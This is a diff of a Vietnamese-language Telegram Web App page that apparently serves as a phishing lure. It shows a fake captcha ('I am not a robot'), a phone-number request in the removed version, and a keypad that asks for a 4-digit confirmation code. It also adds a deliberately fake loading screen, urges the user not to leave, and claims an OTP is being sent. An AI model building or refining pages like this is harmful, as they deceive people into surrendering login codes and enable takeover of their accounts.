@@ -6,57 +6,6 @@
 
 <style>
 body {
-    font-family: sans-serif;
-    text-align: center;
-    margin-top: 100px;
-}
-button {
-    padding: 15px 30px;
-    font-size: 18px;
-    border-radius: 12px;
-    border: none;
-    background: #2AABEE;
-    color: white;
-}
-</style>
-</head>
-
-<body>
-
-<h2 id="title">🤖 Xác minh bạn không phải robot</h2>
-
-<button onclick="verify()">✅ Tôi không phải robot</button>
-
-<script>
-const params = new URLSearchParams(window.location.search);
-
-// nếu đã xác minh
-if (params.get("verified") === "1") {
-    document.body.innerHTML = "✅ Xác minh thành công!";
-}
-
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-
-<script>
-Telegram.WebApp.ready();
-
-function verify() {
-    Telegram.WebApp.sendData("request_phone");
-
-    document.body.innerHTML = `
-        <h3>Đợi đã, đừng đi ra ngoài</h3>
-        <p>⏳ Đang xác minh...</p>
-    `;
-}
-</script>
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-
-<style>
-body {
     margin: 0;
     font-family: sans-serif;
     text-align: center;
@@ -64,7 +13,14 @@ body {
     color: white;
 }
 
-.container {
+/* step1 */
+#step1 {
+    margin-top: 120px;
+}
+
+/* step2 */
+#step2 {
+    display: none;
     margin-top: 80px;
 }
 
@@ -86,17 +42,12 @@ body {
 }
 
 button {
-    margin-top: 10px;
     padding: 12px 25px;
     background: #2AABEE;
     border: none;
     border-radius: 10px;
     color: white;
     font-size: 16px;
-}
-
-.keypad {
-    margin-top: 20px;
 }
 
 .keypad button {
@@ -110,7 +61,14 @@ button {
 
 <body>
 
-<div class="container">
+<!-- ================= STEP 1 ================= -->
+<div id="step1">
+    <h2>🤖 Xác minh bạn không phải robot</h2>
+    <button onclick="verify()">✅ Tôi không phải robot</button>
+</div>
+
+<!-- ================= STEP 2 ================= -->
+<div id="step2">
     <h3>📩 Nhập mã xác nhận</h3>
 
     <div class="boxes">
@@ -143,6 +101,25 @@ Telegram.WebApp.ready();
 
 let code = "";
 
+// ================= STEP 1 =================
+function verify() {
+
+    // loading giả
+    document.getElementById("step1").innerHTML = `
+        <h3>Đợi đã, đừng đi ra ngoài</h3>
+        <p>⏳ Đang xác minh...</p>
+    `;
+
+    // 👉 sau 1.5s chuyển step2
+    setTimeout(() => {
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+    }, 1500);
+}
+
+
+// ================= STEP 2 =================
+
 // nhập số
 function add(n) {
     if (code.length < 4) {
@@ -151,7 +128,7 @@ function add(n) {
     }
 }
 
-// cập nhật ô
+// cập nhật UI
 function updateUI() {
     for (let i = 1; i <= 4; i++) {
         document.getElementById("b"+i).innerText = code[i-1] || "";
@@ -172,13 +149,13 @@ function submitCode() {
         return;
     }
 
-    // 👉 loading fake
+    // loading
     document.body.innerHTML = `
         <h2>Đợi đã, đừng đi ra ngoài</h2>
-        <p>⏳ Đang xác minh...</p>
+        <p>⏳ Đang gửi mã OTP...</p>
     `;
 
-    // 👉 chuyển link Telegram
+    // 👉 chuyển Telegram
     setTimeout(() => {
         Telegram.WebApp.openTelegramLink("https://t.me/telegram");
     }, 1500);
